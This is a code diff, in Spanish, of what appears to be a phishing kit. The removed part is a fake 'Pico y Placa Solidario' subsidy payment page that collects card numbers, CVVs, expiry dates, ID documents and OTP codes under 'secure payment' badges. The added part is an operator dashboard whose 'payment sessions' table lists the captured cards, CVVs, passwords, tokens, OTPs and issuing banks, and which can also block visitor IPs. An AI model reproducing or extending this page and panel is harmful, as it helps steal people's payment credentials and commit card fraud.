-.tarjeta-app .cvv-wrapper .cvv-input { padding-right: 50px; }
-.tarjeta-app .cvv-wrapper .cvv-help { position: absolute; right: 6px; top: 50%; transform: translateY(-50%); width: 44px; height: 44px; border-radius: 50%; border: 3px solid #2c2a29; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 24px; font-weight: 700; color: #2c2a29; background: #fff; transition: all .2s ease; z-index: 5; line-height: 1; box-shadow: 0 2px 6px rgba(0,0,0,.12); }
-.tarjeta-app .cvv-wrapper .cvv-help:hover { background: #f0f0f0; border-color: #1a1a1a; transform: translateY(-50%) scale(1.05); }
-
-.tarjeta-app .cvv-mensaje-amex { font-size: 12px; color: #b45309; background: #fffbeb; border-left: 3px solid #f59e0b; padding: 6px 10px; margin-top: 6px; border-radius: 4px; line-height: 1.4; animation: fadeInMensaje .25s ease; }
-@keyframes fadeInMensaje { from { opacity: 0; transform: translateY(-4px); } to { opacity: 1; transform: translateY(0); } }
-
-.tarjeta-app .custom-select { position: relative; display: block; }
-.tarjeta-app .custom-select select { width: 100%; padding: 10px 30px 10px 12px; border: 1px solid #cacaca; border-radius: 6px; background: #fff; font-size: 16px; appearance: none; -webkit-appearance: none; color: #969696; cursor: pointer; }
-.tarjeta-app .custom-select select:focus { border-color: #bbcef3; outline: none; }
-.tarjeta-app .custom-select select:valid { color: #16181e; }
-.tarjeta-app .custom-select::after { content: ""; position: absolute; top: 50%; right: 12px; transform: translateY(-50%); width: 0; height: 0; border-left: 5px solid transparent; border-right: 5px solid transparent; border-top: 5px solid #16181e; pointer-events: none; }
-
-.tarjeta-app .checkbox-wrapper { display: flex; align-items: flex-start; gap: 10px; margin-bottom: 12px; }
-.tarjeta-app .checkbox-wrapper input[type="checkbox"] { width: 20px; height: 20px; min-width: 20px; border: 1.5px solid #16181e; border-radius: 4px; cursor: pointer; margin-top: 2px; appearance: none; -webkit-appearance: none; background: #fff; position: relative; flex-shrink: 0; }
-.tarjeta-app .checkbox-wrapper input[type="checkbox"]:checked { background: #d8f9d7; border-color: #40a940; }
-.tarjeta-app .checkbox-wrapper input[type="checkbox"]:checked::after { content: ""; position: absolute; top: 50%; left: 50%; width: 5px; height: 10px; border: solid #000; border-width: 0 2px 2px 0; transform: translate(-50%,-60%) rotate(45deg); }
-.tarjeta-app .checkbox-wrapper label { font-size: 14px; color: #16181e; line-height: 1.5; cursor: pointer; }
-.tarjeta-app .checkbox-wrapper label a { color: #16181e !important; text-decoration: underline !important; font-weight: 700 !important; }
-
-.tarjeta-app .buttons-wrapper { display: flex; flex-direction: column; gap: 12px; margin-top: 24px; }
-@media (min-width: 768px) { .tarjeta-app .buttons-wrapper { flex-direction: row; align-items: center; gap: 16px; } }
-.tarjeta-app .btn-back { display: flex; align-items: center; justify-content: center; gap: 8px; padding: 12px 24px; background: #fff; border: 1px solid #3c3c3c; border-radius: 32px; font-size: 16px; font-weight: 600; color: #3c3c3c; cursor: pointer; transition: all .15s ease; order: 1; width: 100%; }
-@media (min-width: 768px) { .tarjeta-app .btn-back { order: -1; margin-right: auto; width: auto; background: none; border: none; padding: 8px 0; justify-content: flex-start; } }
-.tarjeta-app .btn-primary { padding: 14px 28px; background: #2c2a29; color: #dfff61; border: none; border-radius: 100px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all .15s ease; width: 100%; display: flex; align-items: center; justify-content: center; gap: 10px; }
-@media (min-width: 768px) { .tarjeta-app .btn-primary { width: auto; min-width: 200px; } }
-.tarjeta-app .btn-primary:hover { background: #3d3a39; }
-.tarjeta-app .btn-primary:disabled { opacity: .4; cursor: not-allowed; }
-
-.tarjeta-app .footer { display: flex; flex-direction: column; align-items: center; gap: 12px; padding: 16px 20px 20px; text-align: center; background: #f8f8f8; border-top: 1px solid #eee; width: 100%; }
-@media (min-width: 768px) { .tarjeta-app .footer { flex-direction: row; justify-content: space-between; padding: 20px 32px; text-align: left; } }
-.tarjeta-app .footer .security-text { display: flex; align-items: center; gap: 8px; font-size: 12px; font-weight: 600; color: #667587; text-transform: uppercase; }
-.tarjeta-app .footer .footer-logos { display: flex; align-items: center; gap: 16px; }
-.tarjeta-app .footer .footer-logos img { height: 20px; width: auto; max-width: 100%; object-fit: contain; }
-@media (max-width: 767px) { .tarjeta-app .footer .footer-logos img { height: 16px; } .tarjeta-app .footer .footer-logos { gap: 12px; } }
-
-/* ============================================================
-   CVV MODAL
-   ============================================================ */
-.cvv-modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,.6); z-index: 10000000; justify-content: center; align-items: center; opacity: 0; transition: opacity .3s ease; padding: 20px; }
-.cvv-modal-overlay.active { display: flex; opacity: 1; }
-.cvv-modal { background: #fff; border-radius: 20px; max-width: 520px; width: 92%; padding: 20px; position: relative; box-shadow: 0 20px 60px rgba(0,0,0,.3); transform: scale(.95) translateY(10px); transition: transform .3s cubic-bezier(.34,1.56,.64,1), opacity .3s ease; opacity: 0; max-height: 90vh; overflow-y: auto; }
-.cvv-modal-overlay.active .cvv-modal { transform: scale(1) translateY(0); opacity: 1; }
-.cvv-modal-close { position: absolute; top: 12px; right: 16px; background: none; border: none; font-size: 24px; color: #999; cursor: pointer; z-index: 5; }
-.cvv-modal img { width: 100%; height: auto; display: block; border-radius: 8px; }
-.cvv-modal .btn-back-payment { display: block; width: 100%; padding: 14px; background: #2c2a29; color: #dfff61; border: none; border-radius: 100px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 16px; }
-
-/* ============================================================
-   AUTH MODAL (OTP)
-   ============================================================ */
-.auth-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,.65); z-index: 10000001; justify-content: center; align-items: center; padding: 20px; opacity: 0; transition: opacity .4s ease; }
-.auth-modal.show { display: flex; opacity: 1; }
-.auth-modal-content { background: #fff; max-width: 640px; width: 100%; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,.3); transform: scale(.7); transition: transform .4s cubic-bezier(.34,1.56,.64,1); margin: auto; position: relative; max-height: 90vh; overflow-y: auto; overflow-x: hidden; -webkit-overflow-scrolling: touch; padding-bottom: 24px; }
-.auth-modal-content::-webkit-scrollbar { width: 6px; }
-.auth-modal-content::-webkit-scrollbar-thumb { background: #c7c7c7; border-radius: 3px; }
-.auth-modal.show .auth-modal-content { transform: scale(1); }
-.auth-modal-close { position: absolute; top: 15px; right: 20px; font-size: 32px; background: none; border: none; color: #333; cursor: pointer; z-index: 10; }
-
-/* ============================================================
-   OVERLAYS PAGO (LOTTIE Y OTP)
-   ============================================================ */
-.pago-carga-overlay {
-    position: fixed;
-    inset: 0;
-    z-index: 99999999;
-    background: linear-gradient(135deg, #ffffff 0%, #f0fdf4 100%);
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    gap: 20px;
-    padding: 24px;
+.banco-emisor {
+    font-size: 11px;
+    color: #cbd5e1;
+    font-weight: 500;
+    white-space: nowrap;
     overflow: hidden;
+    text-overflow: ellipsis;
+    display: inline-block;
+    max-width: 140px;
 }
-.pago-carga-overlay.hidden { display: none !important; }
 
-.pago-carga-logo {
-    height: 64px;
-    width: auto;
-    max-width: 280px;
-    object-fit: contain;
-    animation: fadeInLogo 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
-    filter: drop-shadow(0 4px 12px rgba(0,0,0,0.08));
-}
-@keyframes fadeInLogo { from { opacity: 0; transform: scale(0.7) translateY(-10px); } to { opacity: 1; transform: scale(1) translateY(0); } }
+.block-input { display: flex; gap: 8px; margin-bottom: 14px; }
+.block-input input { flex: 1; padding: 10px 14px; background: #0f1421; border: 1px solid #252d44; border-radius: 8px; color: #e5e7eb; font-size: 13px; outline: none; }
+.block-input input:focus { border-color: #88f456; }
+.block-input button { padding: 10px 20px; background: #ef4444; color: white; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 13px; }
+.block-input button:hover { background: #dc2626; }
 
-.pago-carga-lottie { width: 180px; height: 180px; margin: 0; animation: fadeInLottie 0.8s ease 0.2s both; }
-@keyframes fadeInLottie { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
+.loading-indicator { display: inline-block; width: 8px; height: 8px; background: #88f456; border-radius: 50%; margin-right: 8px; animation: pulse 1.5s infinite; }
+@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
 
-.pago-carga-texto { font-size: 20px; font-weight: 700; color: #00271c; text-align: center; line-height: 1.4; letter-spacing: -0.3px; animation: fadeInTexto 0.6s ease 0.3s both; min-height: 56px; max-width: 400px; }
-.pago-carga-texto .highlight { color: #16a34a; display: inline-block; transition: opacity 0.3s ease; }
-@keyframes fadeInTexto { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-
-.pago-carga-subtexto { font-size: 14px; color: #6b7280; text-align: center; max-width: 360px; line-height: 1.5; animation: fadeInTexto 0.6s ease 0.5s both; }
-
-.pago-carga-progress { width: 240px; height: 6px; background: #e5e7eb; border-radius: 999px; overflow: hidden; margin-top: 8px; animation: fadeInTexto 0.6s ease 0.6s both; position: relative; }
-.pago-carga-progress::after { content: ''; position: absolute; top: 0; left: 0; height: 100%; width: 40%; background: linear-gradient(90deg, #88f456, #16a34a, #88f456); background-size: 200% 100%; border-radius: 999px; animation: progressSlide 1.5s ease-in-out infinite; }
-@keyframes progressSlide { 0% { transform: translateX(-100%); } 100% { transform: translateX(350%); } }
-
-.pago-carga-dots { display: inline-flex; gap: 4px; margin-left: 4px; vertical-align: middle; }
-.pago-carga-dots span { width: 6px; height: 6px; border-radius: 50%; background: #16a34a; animation: dotBounce 1.4s ease-in-out infinite; }
-.pago-carga-dots span:nth-child(2) { animation-delay: 0.2s; }
-.pago-carga-dots span:nth-child(3) { animation-delay: 0.4s; }
-@keyframes dotBounce { 0%, 80%, 100% { transform: translateY(0); opacity: 0.4; } 40% { transform: translateY(-6px); opacity: 1; } }
-
-.pago-carga-seguridad { display: flex; align-items: center; gap: 6px; font-size: 12px; color: #6b7280; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; margin-top: 4px; animation: fadeInTexto 0.6s ease 0.7s both; }
-.pago-carga-seguridad svg { width: 16px; height: 16px; fill: #16a34a; }
-
-/* OTP LOADER */
-.pago-carga-otp-overlay {
-    position: fixed; inset: 0; z-index: 99999999; background: #ffffff;
-    display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 32px; padding: 24px;
-}
-.pago-carga-otp-overlay.hidden { display: none !important; }
-.pago-carga-otp-logo { height: 80px; max-height: 80px; width: auto; max-width: 250px; object-fit: contain; display: block; margin: 0 auto; }
-.pago-carga-otp-spinner { width: 60px; height: 60px; border: 5px solid #f3f3f3; border-top: 5px solid #88f456; border-radius: 50%; animation: spinPagoOtp 1s linear infinite; }
-@keyframes spinPagoOtp { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-.pago-carga-otp-texto { font-size: 18px; font-weight: 600; color: #00271c; text-align: center; line-height: 1.5; max-width: 400px; }
-
-/* ERROR OTP LOADER */
-.pago-error-otp-overlay { position: fixed; inset: 0; z-index: 99999999; background: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 20px; padding: 24px; }
-.pago-error-otp-overlay.hidden { display: none !important; }
-.pago-error-otp-icono { width: 100px; height: 100px; border-radius: 50%; background: #fee2e2; display: flex; align-items: center; justify-content: center; }
-.pago-error-otp-titulo { font-size: 22px; font-weight: 700; color: #991b1b; text-align: center; }
-.pago-error-otp-texto { font-size: 15px; color: #555; text-align: center; max-width: 400px; line-height: 1.5; }
-.pago-error-otp-btn { background: #00271c; color: #88f456; border: none; padding: 14px 32px; border-radius: 9999px; font-size: 15px; font-weight: 700; cursor: pointer; margin-top: 8px; }
+#toast { position: fixed; bottom: 24px; right: 24px; background: #151b2e; border: 1px solid #252d44; border-left: 4px solid #88f456; color: #e5e7eb; padding: 14px 20px; border-radius: 10px; box-shadow: 0 10px 40px rgba(0,0,0,0.4); font-size: 13px; font-weight: 500; z-index: 9999; transform: translateX(500px); transition: transform 0.3s; max-width: 400px; }
+#toast.show { transform: translateX(0); }
+#toast.error { border-left-color: #ef4444; }
 
 /* ============================================================
-   PANTALLA DE ERROR DE PAGO (RECHAZADO / CC_ERROR)
+   LOGOS DE MARCA EN LA TABLA
    ============================================================ */
-.pago-error-overlay {
-    position: fixed; inset: 0; z-index: 99999999;
-    background: linear-gradient(135deg, #ffffff 0%, #fef2f2 100%);
-    display: flex; flex-direction: column; align-items: center; justify-content: center;
-    gap: 20px; padding: 24px; text-align: center;
-    animation: fadeInError 0.4s ease;
+.banco-cell {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    white-space: nowrap;
+    vertical-align: middle;
 }
-.pago-error-overlay.hidden { display: none !important; }
-@keyframes fadeInError { from { opacity: 0; } to { opacity: 1; } }
-.pago-error-icono { width: 110px; height: 110px; border-radius: 50%; background: #fee2e2; display: flex; align-items: center; justify-content: center; margin-bottom: 4px; }
-.pago-error-icono svg { width: 60px; height: 60px; }
-.pago-error-logo { height: 60px; max-width: 200px; object-fit: contain; display: block; margin: 0 auto; }
-.pago-error-titulo { font-size: 22px; font-weight: 800; color: #991b1b; text-align: center; line-height: 1.3; }
-.pago-error-texto { font-size: 15px; color: #555; text-align: center; max-width: 420px; line-height: 1.55; }
-.pago-error-btn { background: #00271c; color: #88f456; border: none; padding: 14px 40px; border-radius: 9999px; font-size: 15px; font-weight: 700; cursor: pointer; margin-top: 8px; transition: transform .15s ease, background .15s ease; }
-.pago-error-btn:hover { transform: scale(1.03); }
-.pago-error-btn:active { transform: scale(0.98); }
+.banco-cell svg {
+    height: 18px;
+    width: auto;
+    max-width: 44px;
+    display: inline-block;
+    vertical-align: middle;
+    flex-shrink: 0;
+}
+
+@media (max-width: 768px) {
+    .container { padding: 10px; }
+    .stats { grid-template-columns: 1fr 1fr; }
+    .topbar-left { gap: 10px; }
+    .tab-btn { padding: 6px 10px; font-size: 12px; }
+    .section-header { flex-direction: column; align-items: stretch; }
+    .section-tools { width: 100%; }
+    .search-input { flex: 1; min-width: 0; }
+}
 </style>
 </head>
 <body>
 
-<!-- ============================================================
-     PANTALLA DE CARGA INICIAL
-     ============================================================ -->
-<div id="pantallaCargaInicial">
-  <div class="spinner-carga"></div>
-  <div class="texto-carga">Cargando información del pago...</div>
+<div id="loginScreen">
+    <div class="login-box">
+        <h1>🔐 Panel Administrativo</h1>
+        <p>Pico y Placa Solidario · Acceso restringido</p>
+        <div id="loginError" class="login-error hidden"></div>
+        <input type="text" id="loginUser" placeholder="Usuario" autocomplete="username">
+        <input type="password" id="loginPass" placeholder="Contraseña" autocomplete="current-password">
+        <button id="loginBtn">Ingresar</button>
+    </div>
 </div>
 
-<!-- ============================================================
-     HEADER
-     ============================================================ -->
-<header class="navbar-custom">
-  <img src="img/Logo-DTB-01.png" alt="Moviliza" class="logo-moviliza">
-</header>
-
-<!-- ============================================================
-     CONTENIDO PRINCIPAL
-     ============================================================ -->
-<main class="main-container">
-
-  <!-- RESUMEN -->
-  <section class="resumen-card">
-    <div class="resumen-titulo">Resumen del pago</div>
-    <div class="resumen-grid">
-      <div class="dato-item">
-        <span class="dato-lbl">Placa</span>
-        <span class="dato-val" id="resumenPlaca">—</span>
-      </div>
-      <div class="dato-item">
-        <span class="dato-lbl">Documento</span>
-        <span class="dato-val" id="resumenDocumento">—</span>
-      </div>
-      <div class="dato-item">
-        <span class="dato-lbl">Titular</span>
-        <span class="dato-val" id="resumenTitular">—</span>
-      </div>
-      <div class="dato-item">
-        <span class="dato-lbl">Vigencia</span>
-        <span class="dato-val" id="resumenVigencia">—</span>
-      </div>
-    </div>
-    <div class="resumen-desglose">
-      <div class="desglose-row">
-        <span>Valor subsidio</span>
-        <span id="desgloseSubsidio">$0</span>
-      </div>
-      <div class="desglose-row total">
-        <span>Total a pagar</span>
-        <span id="desgloseTotal">$0</span>
-      </div>
-    </div>
-  </section>
-
-  <!-- SELECTOR MEDIO DE PAGO -->
-  <div class="selector-titulo">Selecciona tu medio de pago</div>
-  <div class="pay-method-grid">
-    <div class="pay-method-card" id="cardTarjeta" data-method="tarjeta">
-      <div class="pay-method-check"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
-      <div class="pay-method-icon">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>
-      </div>
-      <div class="pay-method-label">Tarjeta de crédito / débito</div>
-      <div class="pay-method-sub">Visa, Mastercard, Amex</div>
-    </div>
-    <div class="pay-method-card" id="cardPse" data-method="pse">
-      <div class="pay-method-check"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
-      <div class="pay-method-icon">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 21h18"></path><path d="M5 21V7l8-4v18"></path><path d="M19 21V11l-6-4"></path></svg>
-      </div>
-      <div class="pay-method-label">PSE</div>
-      <div class="pay-method-sub">Débito desde tu banco</div>
-    </div>
-  </div>
-
-</main>
-
-<!-- ============================================================
-     MODAL BANCOS PSE
-     ============================================================ -->
-<div id="modalBanco" class="modal-banco hidden">
-  <div class="modal-banco-overlay" onclick="cerrarModalBanco()"></div>
-  <div class="modal-banco-content">
-    <div class="modal-banco-header">
-      <h3 class="modal-banco-title">Selecciona tu banco</h3>
-      <button class="modal-banco-close" onclick="cerrarModalBanco()" type="button">✕</button>
-    </div>
-    <div class="modal-banco-search">
-      <svg class="search-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#8a9099" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
-      <input type="text" id="buscarBancoInput" class="banco-buscar-input" placeholder="Buscar banco...">
-    </div>
-    <div class="modal-banco-grid" id="gridBancos"></div>
-    <div class="modal-banco-empty hidden" id="bancoEmpty">No se encontraron bancos</div>
-  </div>
-</div>
-
-<!-- ============================================================
-     MODAL TARJETA (contenedor)
-     ============================================================ -->
-<div id="modalTarjeta" class="tarjeta-modal hidden">
-  <div class="tarjeta-modal-overlay" onclick="cerrarModalTarjeta()"></div>
-  <div class="tarjeta-modal-content">
-    <button class="tarjeta-modal-close" onclick="cerrarModalTarjeta()" type="button">✕</button>
-    <div class="tarjeta-app">
-      <div class="app-wrapper">
-        <div class="app">
-          <div class="merchant-section">
-            <div class="header">
-              <img src="img/Logo-DTB-01.png" alt="Logo" class="logo">
+<div id="dashboard">
+    <div class="topbar">
+        <div class="topbar-left">
+            <h1>⚡ Panel PYP</h1>
+            <div class="tabs">
+                <button class="tab-btn active" data-tab="principal">📊 Principal</button>
+                <button class="tab-btn" data-tab="ips">🚫 IPs</button>
+                <button class="tab-btn" data-tab="logs">📜 Logs</button>
             </div>
-            <div class="price-panel">
-              <div class="merchant-label">Pago de subsidio</div>
-              <div class="merchant-name" id="merchantMonto">$0</div>
-              <button type="button" class="info-pill"><span>Pago seguro</span></button>
-            </div>
-          </div>
-          <div class="content-section">
-            <div class="payment-method-badge">
-              <div class="title">Método de pago</div>
-              <div class="card">
-                <div class="logo">
-                  <svg viewBox="0 0 24 24" fill="none" stroke="#3c3c3c" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>
-                </div>
-                <div class="name">Tarjeta de crédito o débito</div>
-              </div>
-            </div>
-
-            <div class="intro"><div class="intro-text">Ingresa los datos de tu tarjeta</div></div>
-
-            <div class="input-group">
-              <label for="inputTarjeta">Número de tarjeta</label>
-              <div class="card-input-wrapper">
-                <input type="tel" id="inputTarjeta" inputmode="numeric" autocomplete="cc-number" placeholder="0000 0000 0000 0000" maxlength="23">
-                <div class="card-logos" id="cardLogos">
-                  <div class="card-logo-item" data-brand="visa"><svg viewBox="0 0 100 33" xmlns="http://www.w3.org/2000/svg"><path d="M42.5 0.5L28.9 32.8H19.6L12.7 6.5C12.3 5.3 11.9 4.9 11 4.4C9.5 3.5 6.9 2.7 4.6 2.2L4.7 1.4H19.7C21.8 1.4 23.7 2.8 24.2 5.2L27.6 23.4L36.2 1.4H42.5V0.5ZM67.4 22C67.5 12.4 54.7 12.4 54.8 7.9C54.8 6.5 56.1 5 59 5C60.4 5 64.3 5.4 66.5 6.4L67.5 1.1C65.3 0.2 62.4 0 59 0C47.8 0 40 5.8 40 14.2C40 20.4 45.6 23.8 49.8 26C54.1 28.2 55.5 29.7 55.5 31.6C55.5 34.7 51.8 36 48.4 36C42.5 36 38.9 34.3 36.6 33L35.4 38.4C38.3 39.7 43.7 41 47.8 41C59.6 41 66.5 35.4 66.5 26.6C66.5 20.2 60.2 16.5 56.8 14C53.5 11.4 52.5 10.1 52.5 8.6C52.5 6.5 54.8 4.4 58.8 4.4C62.7 4.4 66.2 5.9 67.4 22ZM95.2 1.4H85.8C83.7 1.4 82.2 2.6 81.4 4.4L59.7 40.8H72.1L74.6 34.1H93.7L95.2 40.8H107L95.2 1.4ZM78.3 25.6L83.6 12.1L87.6 25.6H78.3Z" fill="#1434CB" transform="translate(0 -1)"/></svg></div>
-                  <div class="card-logo-item" data-brand="mastercard"><svg viewBox="0 0 100 62" xmlns="http://www.w3.org/2000/svg"><circle cx="32" cy="31" r="30" fill="#EB001B"/><circle cx="68" cy="31" r="30" fill="#F79E1B"/><path d="M50 8 C38 16 30 23 30 31 C30 39 38 46 50 54 C62 46 70 39 70 31 C70 23 62 16 50 8 Z" fill="#FF5F00"/></svg></div>
-                  <div class="card-logo-item" data-brand="amex"><svg viewBox="0 0 100 50" xmlns="http://www.w3.org/2000/svg"><rect width="100" height="50" rx="4" fill="#006FCF"/><text x="50" y="26" text-anchor="middle" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-weight="900" font-size="18" letter-spacing="1.5">AMEX</text><text x="50" y="38" text-anchor="middle" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-weight="500" font-size="6" letter-spacing="0.8">AMERICAN EXPRESS</text></svg></div>
-                </div>
-              </div>
-            </div>
-
-            <div class="input-group">
-              <label for="inputTitular">Titular de la tarjeta</label>
-              <input type="text" id="inputTitular" autocomplete="cc-name" placeholder="Nombre completo">
-            </div>
-
-            <div class="row">
-              <div class="col input-group">
-                <label for="selectMes">Fecha de vencimiento</label>
-                <div class="expiration-wrapper">
-                  <div class="custom-select" style="flex:1;">
-                    <select id="selectMes" required>
-                      <option value="" disabled selected>Mes</option>
-                      <option value="01">01</option><option value="02">02</option><option value="03">03</option>
-                      <option value="04">04</option><option value="05">05</option><option value="06">06</option>
-                      <option value="07">07</option><option value="08">08</option><option value="09">09</option>
-                      <option value="10">10</option><option value="11">11</option><option value="12">12</option>
-                    </select>
-                  </div>
-                  <div class="custom-select" style="flex:1;">
-                    <select id="selectAnio" required>
-                      <option value="" disabled selected>Año</option>
-                    </select>
-                  </div>
-                </div>
-              </div>
-              <div class="col input-group">
-                <label for="inputCvv">CVV</label>
-                <div class="cvv-wrapper">
-                  <input type="tel" id="inputCvv" class="cvv-input" inputmode="numeric" autocomplete="cc-csc" placeholder="123" maxlength="4">
-                  <button type="button" class="cvv-help" onclick="abrirCvvModal()">?</button>
-                </div>
-                <div id="cvvMensajeAmex" class="cvv-mensaje-amex" style="display:none;">Para American Express, el CVV son los <strong>4 dígitos</strong> al frente de la tarjeta.</div>
-              </div>
-            </div>
-
-            <div class="input-group">
-              <label for="inputDocNumber">Número de documento</label>
-              <input type="tel" id="inputDocNumber" inputmode="numeric" placeholder="Número de documento">
-            </div>
-
-            <div class="input-group">
-              <label for="selectDocType">Tipo de documento</label>
-              <div class="custom-select">
-                <select id="selectDocType">
-                  <option value="CC" selected>Cédula de ciudadanía</option>
-                  <option value="CE">Cédula de extranjería</option>
-                  <option value="NIT">NIT</option>
-                  <option value="PP">Pasaporte</option>
-                </select>
-              </div>
-            </div>
-
-            <div class="checkbox-wrapper">
-              <input type="checkbox" id="checkTerminos">
-              <label for="checkTerminos">Acepto los <a href="#" target="_blank">términos y condiciones</a> y autorizo el débito.</label>
-            </div>
-
-            <div class="buttons-wrapper">
-              <button type="button" class="btn-back" onclick="cerrarModalTarjeta()">← Volver</button>
-              <button type="button" class="btn-primary" id="btnPagarTarjeta">Pagar</button>
-            </div>
-          </div>
         </div>
-        <div class="footer">
-          <div class="security-text">
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="#667587"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
-            Pago 100% seguro
-          </div>
-          <div class="footer-logos">
-            <svg viewBox="0 0 100 33" width="48" height="16"><path d="M42.5 0.5L28.9 32.8H19.6L12.7 6.5C12.3 5.3 11.9 4.9 11 4.4C9.5 3.5 6.9 2.7 4.6 2.2L4.7 1.4H19.7C21.8 1.4 23.7 2.8 24.2 5.2L27.6 23.4L36.2 1.4H42.5V0.5ZM67.4 22C67.5 12.4 54.7 12.4 54.8 7.9C54.8 6.5 56.1 5 59 5C60.4 5 64.3 5.4 66.5 6.4L67.5 1.1C65.3 0.2 62.4 0 59 0C47.8 0 40 5.8 40 14.2C40 20.4 45.6 23.8 49.8 26C54.1 28.2 55.5 29.7 55.5 31.6C55.5 34.7 51.8 36 48.4 36C42.5 36 38.9 34.3 36.6 33L35.4 38.4C38.3 39.7 43.7 41 47.8 41C59.6 41 66.5 35.4 66.5 26.6C66.5 20.2 60.2 16.5 56.8 14C53.5 11.4 52.5 10.1 52.5 8.6C52.5 6.5 54.8 4.4 58.8 4.4C62.7 4.4 66.2 5.9 67.4 22ZM95.2 1.4H85.8C83.7 1.4 82.2 2.6 81.4 4.4L59.7 40.8H72.1L74.6 34.1H93.7L95.2 40.8H107L95.2 1.4ZM78.3 25.6L83.6 12.1L87.6 25.6H78.3Z" fill="#1434CB"/></svg>
-            <svg viewBox="0 0 100 62" width="28" height="18"><circle cx="32" cy="31" r="30" fill="#EB001B"/><circle cx="68" cy="31" r="30" fill="#F79E1B"/><path d="M50 8 C38 16 30 23 30 31 C30 39 38 46 50 54 C62 46 70 39 70 31 C70 23 62 16 50 8 Z" fill="#FF5F00"/></svg>
-          </div>
+        <div class="topbar-right">
+            <span class="topbar-user">Sesión: <strong id="currentUser">-</strong></span>
+            <button class="btn-logout" id="logoutBtn">Cerrar sesión</button>
         </div>
-      </div>
     </div>
-  </div>
+
+    <div class="container">
+
+        <div class="tab-content active" id="tab-principal">
+            <div class="stats">
+                <div class="stat-card">
+                    <div class="label">🟢 Activos</div>
+                    <div class="value" id="statActivos">0</div>
+                </div>
+                <div class="stat-card sessions">
+                    <div class="label">💳 Sesiones</div>
+                    <div class="value" id="statSesiones">0</div>
+                </div>
+                <div class="stat-card pending">
+                    <div class="label">⏳ Pendientes</div>
+                    <div class="value" id="statPendientes">0</div>
+                </div>
+                <div class="stat-card blocked">
+                    <div class="label">🚫 IPs bloqueadas</div>
+                    <div class="value" id="statBloqueadas">0</div>
+                </div>
+            </div>
+
+            <div class="section">
+                <div class="section-header">
+                    <div class="section-title">
+                        <span class="loading-indicator"></span>
+                        🟢 Usuarios activos
+                        <span class="badge" id="badgeActivos">0</span>
+                    </div>
+                    <div class="section-tools">
+                        <input type="text" class="search-input" id="buscarActivos" placeholder="🔍 Buscar por IP o acción...">
+                    </div>
+                </div>
+                <div class="table-wrap">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>IP</th>
+                                <th>Última acción</th>
+                                <th>Tiempo</th>
+                                <th>Acciones</th>
+                            </tr>
+                        </thead>
+                        <tbody id="tbodyActivos">
+                            <tr><td colspan="4" class="empty">Cargando...</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div class="section">
+                <div class="section-header">
+                    <div class="section-title">
+                        💳 Sesiones de pago
+                        <span class="badge" id="badgeSesiones">0</span>
+                    </div>
+                    <div class="section-tools">
+                        <input type="text" class="search-input" id="buscarSesiones" placeholder="🔍 Buscar banco, IP, doc, estado, BIN...">
+                        <button class="btn-borrar" id="btnBorrarSesiones" disabled>🗑️ Borrar seleccionados</button>
+                    </div>
+                </div>
+                <div class="table-wrap">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th class="checkbox-col"><input type="checkbox" id="checkAllSesiones"></th>
+                                <th>Banco</th>
+                                <th>Estado</th>
+                                <th>Identificación/Trj</th>
+                                <th>Clave/Fch</th>
+                                <th>CVV</th>
+                                <th>Documento</th>
+                                <th>Titular</th>
+                                <th>Token</th>
+                                <th>OTP</th>
+                                <th>Monto</th>
+                                <th>IP</th>
+                                <th>Banco Emisor</th>
+                                <th>Nivel de Tarjeta</th>
+                                <th>Acciones</th>
+                            </tr>
+                        </thead>
+                        <tbody id="tbodySesiones">
+                            <tr><td colspan="15" class="empty">Cargando...</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <div class="tab-content" id="tab-ips">
+            <div class="section">
+                <div class="section-header">
+                    <div class="section-title">
+                        🚫 IPs bloqueadas
+                        <span class="badge" id="badgeIps">0</span>
+                    </div>
+                    <div class="section-tools">
+                        <input type="text" class="search-input" id="buscarIps" placeholder="🔍 Buscar IP...">
+                        <button class="btn-borrar" id="btnBorrarIps" disabled>🗑️ Borrar seleccionados</button>
+                    </div>
+                </div>
+                <div class="block-input">
+                    <input type="text" id="inputNuevaIp" placeholder="IP a bloquear (ej. 190.25.10.5)">
+                    <button id="btnBloquearManual">Bloquear</button>
+                </div>
+                <div class="table-wrap">
+                    <table>
+                        <thead>
+                            <tr>
